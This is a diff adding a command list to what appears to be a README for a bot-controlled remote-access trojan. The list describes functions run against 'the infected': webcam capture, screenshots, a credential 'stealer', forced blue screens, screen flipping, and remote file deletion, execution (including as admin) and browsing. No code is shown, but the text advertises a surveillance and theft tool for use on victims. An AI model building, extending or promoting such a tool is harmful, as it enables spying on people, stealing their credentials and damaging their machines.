@@ -20,3 +20,23 @@ Test bot
 
 
 Then it's up to you
+
+
+the functions
+
+webcam - takes a picture from a webcam
+screen - takes a screenshot
+steal - stealer
+info - returns information about the infected
+degress - flips the screen
+bsod - bsod
+help - list of commands 
+cursor - drug cursor 
+direct - return directory
+webopen - open url
+removefile - remove file
+startfile - start file
+scanfile - return files
+startfileasad - start file as Admin
+save - save file [BETA]
+cd - goes to the directory
